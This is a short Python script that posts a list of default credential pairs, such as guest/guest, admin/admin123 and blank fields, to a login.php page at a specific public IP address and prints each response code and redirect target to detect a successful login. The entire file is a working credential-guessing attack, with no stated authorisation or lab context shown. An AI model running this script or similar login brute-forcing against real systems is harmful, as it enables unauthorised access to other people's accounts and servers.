import requests
combos = [("guest","guest"),("test","test"),("demo","demo"),("operator","operator"),
          ("admin","admin123"),("admin",""),("","")]
for u,p in combos:
    r = requests.post("http://52.66.177.113/login.php", data={"username":u,"password":p}, allow_redirects=False)
    print(u,p,"->",r.status_code, r.headers.get("Location"))
